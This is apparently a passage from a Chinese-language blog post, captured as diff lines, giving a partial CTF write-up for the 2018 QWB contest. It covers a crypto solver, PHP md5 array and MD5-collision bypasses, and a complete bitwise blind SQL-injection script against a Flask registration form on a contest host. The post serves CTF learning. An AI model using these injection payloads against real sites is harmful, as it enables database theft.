+<span id="cb3-15"><a href="#cb3-15" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb3-16"><a href="#cb3-16" aria-hidden="true" tabindex="-1"></a>flag <span class="op">=</span> []</span>
+<span id="cb3-17"><a href="#cb3-17" aria-hidden="true" tabindex="-1"></a>i <span class="op">=</span> <span class="dv">0</span></span>
+<span id="cb3-18"><a href="#cb3-18" aria-hidden="true" tabindex="-1"></a><span class="cf">while</span> i <span class="op">&lt;</span> <span class="bu">len</span>(b):</span>
+<span id="cb3-19"><a href="#cb3-19" aria-hidden="true" tabindex="-1"></a>    <span class="cf">for</span> front <span class="kw">in</span> <span class="bu">range</span>(<span class="dv">33</span>, <span class="dv">128</span>):</span>
+<span id="cb3-20"><a href="#cb3-20" aria-hidden="true" tabindex="-1"></a>        <span class="cf">for</span> back <span class="kw">in</span> <span class="bu">range</span>(<span class="dv">33</span>, <span class="dv">128</span>):</span>
+<span id="cb3-21"><a href="#cb3-21" aria-hidden="true" tabindex="-1"></a>            <span class="cf">if</span> (a[i] <span class="op">==</span> b[i] <span class="op">*</span> front <span class="op">*</span> front <span class="op">+</span> c[i] <span class="op">*</span> front <span class="op">+</span> d[i]) <span class="kw">and</span> (</span>
+<span id="cb3-22"><a href="#cb3-22" aria-hidden="true" tabindex="-1"></a>                    a[i <span class="op">+</span> <span class="dv">1</span>] <span class="op">==</span> b[i] <span class="op">*</span> back <span class="op">*</span> back <span class="op">+</span> c[i] <span class="op">*</span> back <span class="op">+</span> d[i]):</span>
+<span id="cb3-23"><a href="#cb3-23" aria-hidden="true" tabindex="-1"></a>                <span class="bu">print</span> front, back</span>
+<span id="cb3-24"><a href="#cb3-24" aria-hidden="true" tabindex="-1"></a>                flag.append(<span class="bu">chr</span>(front))</span>
+<span id="cb3-25"><a href="#cb3-25" aria-hidden="true" tabindex="-1"></a>    i <span class="op">+=</span> <span class="dv">1</span></span>
+<span id="cb3-26"><a href="#cb3-26" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb3-27"><a href="#cb3-27" aria-hidden="true" tabindex="-1"></a><span class="bu">print</span> <span class="st">&quot;&quot;</span>.join(flag) <span class="op">+</span> <span class="st">&quot;&#125;&quot;</span></span></code></pre></div>
+<p><img src="/blog/2018/03/26/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AF-QWB-%E9%83%A8%E5%88%86Writeup/22-20-11.jpg"></p>
+<h1 id="web">Web</h1>
+<h2 id="web签到">Web签到</h2>
+<p>源码找到提示 第一关 <img src="/blog/2018/03/26/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AF-QWB-%E9%83%A8%E5%88%86Writeup/22-22-20.jpg">
+老套路了，用数组就可以绕过，因为<code>md5()</code>函数遇到数组会返回<code>NULL</code>，然后就绕过了
+Payload ：<code>param1[]=1&amp;param2[]=2</code> 第二关 <img src="/blog/2018/03/26/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AF-QWB-%E9%83%A8%E5%88%86Writeup/22-22-27.jpg">同理，上次的Payload也能绕过
+第三关 <img src="/blog/2018/03/26/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AF-QWB-%E9%83%A8%E5%88%86Writeup/22-25-25.jpg"></p>
+<p>多了个(string)强制类型转换，再也不能用数组绕过了，因为(string)强制类型转换之后数组会变成Array,而这玩意即使你数字里面的值是不一样的也会判断为相等。
+这里我们可用MD5相同的碰撞文件进行绕过
+利用到一个相同MD5文件生成的程序fastcoll.exe，作用是生成两个不同内容但是MD5的值却是一样的文件(猜测应该是基于我国信安领域的风云人物——王小云教授的快速MD5碰撞算法)
+用工具生成两个文件之后用python对文件进行url编码再上传就可以了</p>
+<div class="sourceCode" id="cb4"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> urllib</span>
+<span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a>f1 <span class="op">=</span> <span class="bu">open</span>(<span class="st">&quot;./msg1.bin&quot;</span>,<span class="st">&quot;rb&quot;</span>)</span>
+<span id="cb4-3"><a href="#cb4-3" aria-hidden="true" tabindex="-1"></a>f2 <span class="op">=</span> <span class="bu">open</span>(<span class="st">&quot;./msg2.bin&quot;</span>,<span class="st">&quot;rb&quot;</span>)</span>
+<span id="cb4-4"><a href="#cb4-4" aria-hidden="true" tabindex="-1"></a>m1 <span class="op">=</span> f1.read()</span>
+<span id="cb4-5"><a href="#cb4-5" aria-hidden="true" tabindex="-1"></a>m2 <span class="op">=</span> f2.read()</span>
+<span id="cb4-6"><a href="#cb4-6" aria-hidden="true" tabindex="-1"></a><span class="bu">print</span> urllib.quote(m1)</span>
+<span id="cb4-7"><a href="#cb4-7" aria-hidden="true" tabindex="-1"></a><span class="bu">print</span> urllib.quote(m2)</span></code></pre></div>
+<p><img src="/blog/2018/03/26/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AF-QWB-%E9%83%A8%E5%88%86Writeup/23-55-55.jpg"> ##
+Python_is_the_best_language1
+拿到源码发现是flask的web站，简单浏览了一下，由于之前就耳闻flask不用担心sql注入之类的言论，我就没太注意注入这方面反而去寻找有没有提示以及模板注入之类的
+最后发现类似于</p>
+<div class="sourceCode" id="cb5"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a>user <span class="op">=</span> query_db(<span class="st">&#39;select * from users where username = </span><span class="sc">%s</span><span class="st">&#39;</span> <span class="op">%</span> <span class="st">&quot;请求的参数&quot;</span>） </span></code></pre></div>
+<p>这种用格式化字符串构造sql语句的是仍然会产生sql注入的，而</p>
+<div class="sourceCode" id="cb6"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a>user <span class="op">=</span> query_db(<span class="st">&#39;select * from users where username = ?&#39;</span>, [the_username], one<span class="op">=</span><span class="va">True</span>) </span></code></pre></div>
+<p>这种的危险字符将会被转义而不用担心sql注入问题
+在源码的<code>form.py</code>中的<code>RegistrationForm</code>类发现<code>email</code>并没有过滤，而是直接调用了自己写的<code>mysql.One()</code>函数
+<img src="/blog/2018/03/26/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AF-QWB-%E9%83%A8%E5%88%86Writeup/00-03-07.jpg">
+看起来注入点很可能是在这里
+来到<code>others.py</code>中定义的<code>mysql.One()</code>：</p>
+<p><img src="/blog/2018/03/26/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AF-QWB-%E9%83%A8%E5%88%86Writeup/00-04-05.jpg"></p>
+<p>继续跟踪函数<code>mysql.Sel()</code>： <img src="/blog/2018/03/26/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AF-QWB-%E9%83%A8%E5%88%86Writeup/00-04-37.jpg"></p>
+<p>很明显看到构造的语句并没有使用flask带的转义功能而是直接凭借Sql语句然后返回的
+于是我们可以利用注册界面构造<code>email</code>参数为注入语句</p>
+<div class="sourceCode" id="cb7"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a> email <span class="op">=</span> <span class="st">&#39; or ord(substr((查询语句) &#123;字符串偏移&#125; , 1 ))&amp;&#123;按位与&#125;</span></span></code></pre></div>
+<p>由上可知邮箱找到及sql语句为真时会<code>raise</code>一个<code>Please use a diffrent email address.</code>错误，我们可以用来当盲注的依据。唯一要注意的是我们需要将注册页面的<code>token</code>爬下来顺便带上，提交后下次的<code>token</code>也要带上</p>
+<div class="sourceCode" id="cb8"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> requests, re</span>
+<span id="cb8-2"><a href="#cb8-2" aria-hidden="true" tabindex="-1"></a>url <span class="op">=</span> <span class="st">&quot;http://117.50.16.51:20000/register&quot;</span></span>
+<span id="cb8-3"><a href="#cb8-3" aria-hidden="true" tabindex="-1"></a>r <span class="op">=</span> requests.get(url)</span>
+<span id="cb8-4"><a href="#cb8-4" aria-hidden="true" tabindex="-1"></a>token <span class="op">=</span> re.findall(<span class="st">&#39;&lt;input id=&quot;csrf_token&quot;.*?value=&quot;(.*?)&quot;&gt;&#39;</span>, r.text)[<span class="dv">0</span>]</span>
+<span id="cb8-5"><a href="#cb8-5" aria-hidden="true" tabindex="-1"></a><span class="bu">str</span> <span class="op">=</span> <span class="st">&#39;&#39;</span></span>
+<span id="cb8-6"><a href="#cb8-6" aria-hidden="true" tabindex="-1"></a>payload_db <span class="op">=</span> <span class="st">&quot;(database())&quot;</span></span>
+<span id="cb8-7"><a href="#cb8-7" aria-hidden="true" tabindex="-1"></a><span class="co"># flask</span></span>
+<span id="cb8-8"><a href="#cb8-8" aria-hidden="true" tabindex="-1"></a>payload_tables <span class="op">=</span> <span class="st">&quot;(select</span><span class="ch">\x20</span><span class="st">group_concat(table_name)</span><span class="ch">\x20</span><span class="st">from</span><span class="ch">\x20</span><span class="st">information_schema.tables</span><span class="ch">\x20</span><span class="st">where</span><span class="ch">\x20</span><span class="st">table_schema=database())&quot;</span></span>
+<span id="cb8-9"><a href="#cb8-9" aria-hidden="true" tabindex="-1"></a><span class="co"># flaaaaag,followers,post,user</span></span>
+<span id="cb8-10"><a href="#cb8-10" aria-hidden="true" tabindex="-1"></a>payload_columns <span class="op">=</span> <span class="st">&quot;(select</span><span class="ch">\x20</span><span class="st">group_concat(column_name)</span><span class="ch">\x20</span><span class="st">from</span><span class="ch">\x20</span><span class="st">information_schema.columns</span><span class="ch">\x20</span><span class="st">where</span><span class="ch">\x20</span><span class="st">table_name=&#39;flaaaaag&#39;)&quot;</span></span>
+<span id="cb8-11"><a href="#cb8-11" aria-hidden="true" tabindex="-1"></a><span class="co"># flllllag</span></span>
+<span id="cb8-12"><a href="#cb8-12" aria-hidden="true" tabindex="-1"></a>payload_flag <span class="op">=</span> <span class="st">&quot;(select</span><span class="ch">\x20</span><span class="st">flllllag</span><span class="ch">\x20</span><span class="st">from</span><span class="ch">\x20</span><span class="st">flaaaaag)&quot;</span></span>
+<span id="cb8-13"><a href="#cb8-13" aria-hidden="true" tabindex="-1"></a><span class="co">#QWB&#123;us1ng_val1dator_caut1ous&#125;</span></span>
+<span id="cb8-14"><a href="#cb8-14" aria-hidden="true" tabindex="-1"></a>l <span class="op">=</span> [<span class="dv">1</span>, <span class="dv">2</span>, <span class="dv">4</span>, <span class="dv">8</span>, <span class="dv">16</span>, <span class="dv">32</span>, <span class="dv">64</span>]</span>
+<span id="cb8-15"><a href="#cb8-15" aria-hidden="true" tabindex="-1"></a><span class="cf">for</span> i <span class="kw">in</span> <span class="bu">range</span>(<span class="dv">1</span>, <span class="dv">50</span>):</span>
+<span id="cb8-16"><a href="#cb8-16" aria-hidden="true" tabindex="-1"></a>    n <span class="op">=</span> <span class="dv">0</span></span>
+<span id="cb8-17"><a href="#cb8-17" aria-hidden="true" tabindex="-1"></a>    <span class="cf">for</span> j <span class="kw">in</span> l:</span>
+<span id="cb8-18"><a href="#cb8-18" aria-hidden="true" tabindex="-1"></a>        payload <span class="op">=</span> <span class="st">&quot;&#39;or</span><span class="ch">\x20</span><span class="st">ord(substr(&quot;</span> <span class="op">+</span> payload_flag <span class="op">+</span> <span class="st">&quot;,</span><span class="sc">&#123;&#125;</span><span class="st">,1))&amp;</span><span class="sc">&#123;&#125;</span><span class="st">#@gmail.com&quot;</span>.<span class="bu">format</span>(i, j)</span>
+<span id="cb8-19"><a href="#cb8-19" aria-hidden="true" tabindex="-1"></a>        post_data <span class="op">=</span> &#123;</span>
+<span id="cb8-20"><a href="#cb8-20" aria-hidden="true" tabindex="-1"></a>            <span class="st">&#39;csrf_token&#39;</span>: token,</span>
+<span id="cb8-21"><a href="#cb8-21" aria-hidden="true" tabindex="-1"></a>            <span class="st">&#39;username&#39;</span>: <span class="st">&#39;testzero&#39;</span>,</span>
+<span id="cb8-22"><a href="#cb8-22" aria-hidden="true" tabindex="-1"></a>            <span class="st">&#39;email&#39;</span>: payload,</span>
+<span id="cb8-23"><a href="#cb8-23" aria-hidden="true" tabindex="-1"></a>            <span class="st">&#39;password&#39;</span>: <span class="st">&#39;sa&#39;</span>,</span>
+<span id="cb8-24"><a href="#cb8-24" aria-hidden="true" tabindex="-1"></a>            <span class="st">&#39;password2&#39;</span>: <span class="st">&#39;sa&#39;</span>,</span>
+<span id="cb8-25"><a href="#cb8-25" aria-hidden="true" tabindex="-1"></a>            <span class="st">&#39;submit&#39;</span>: <span class="st">&#39;Register&#39;</span></span>
+<span id="cb8-26"><a href="#cb8-26" aria-hidden="true" tabindex="-1"></a>        &#125;</span>
+<span id="cb8-27"><a href="#cb8-27" aria-hidden="true" tabindex="-1"></a>        r <span class="op">=</span> requests.post(url, data<span class="op">=</span>post_data)</span>
+<span id="cb8-28"><a href="#cb8-28" aria-hidden="true" tabindex="-1"></a>        token <span class="op">=</span> re.findall(<span class="st">&#39;&lt;input id=&quot;csrf_token&quot;.*?value=&quot;(.*?)&quot;&gt;&#39;</span>, r.text)[<span class="dv">0</span>]</span>
+<span id="cb8-29"><a href="#cb8-29" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="st">&quot;different email address&quot;</span> <span class="kw">in</span> r.text:</span>
+<span id="cb8-30"><a href="#cb8-30" aria-hidden="true" tabindex="-1"></a>            n <span class="op">+=</span> j</span>
+<span id="cb8-31"><a href="#cb8-31" aria-hidden="true" tabindex="-1"></a>    <span class="bu">str</span> <span class="op">+=</span> <span class="bu">chr</span>(n)</span>
+<span id="cb8-32"><a href="#cb8-32" aria-hidden="true" tabindex="-1"></a>    <span class="bu">print</span> <span class="bu">str</span></span></code></pre></div>
+<p><img src="/blog/2018/03/26/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AF-QWB-%E9%83%A8%E5%88%86Writeup/00-12-41.jpg"></p>
+<h1 id="misc">MISC</h1>
+<h2 id="welcome">Welcome</h2>
+<p>很简单的位移然后加入其他干扰的像素点，丢进Stegsolve偏移100就能看到flag了
+<img src="/blog/2018/03/26/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AF-QWB-%E9%83%A8%E5%88%86Writeup/22-05-12.jpg">
+最后混得了个206名，也不知道有没有个安慰奖</p>
+<h1 id="总结">总结</h1>
+<ul>
+<li>PWN题太嫩了，学了几个月门也没算进</li>
+<li>Web的漏洞积累薄弱，一些新漏洞、新奇的漏洞都未涉及，导致思维面过窄</li>
+<li>此次比赛见识到自己的很多如积累过少、认识过浅等致命缺点，任何领域的熟悉、精通都绝非易事</li>
+</ul>
+<p>期间经历了很多事
+人生不就是<del>起起</del>落落落落落落落落落落落落落落落落落落落落落落落落么</p>
+<p><img src="/blog/2018/03/26/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AF-QWB-%E9%83%A8%E5%88%86Writeup/%5DGSXMJ5UWA@JXUOGWYFN3%5DI.jpg"></p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>T3stzer0</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="https://testzero-wz.github.io/2018/03/26/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AF-QWB-%E9%83%A8%E5%88%86Writeup/">https://testzero-wz.github.io/2018/03/26/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AF-QWB-%E9%83%A8%E5%88%86Writeup/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/blog/tag/CTF/"># CTF</a>
+                    
+                        <a href="/blog/tag/WriteUp/"># WriteUp</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/blog/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/blog/2018/03/27/RPO%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90/">RPO攻击解析</a>
+            
+            
+            <a class="next" rel="next" href="/blog/2018/03/18/%E5%9F%BA%E4%BA%8ETk%E7%9A%84%E5%A4%9A%E7%BA%BF%E7%A8%8B%E9%80%89%E8%AF%BE%E7%A8%8B%E5%BA%8F/">基于Tk的多线程选课程序</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <!-- 
+<footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© T3stzer0 | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+-->
+<script src="/js/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+
+    </div>
+</body>
+</html>
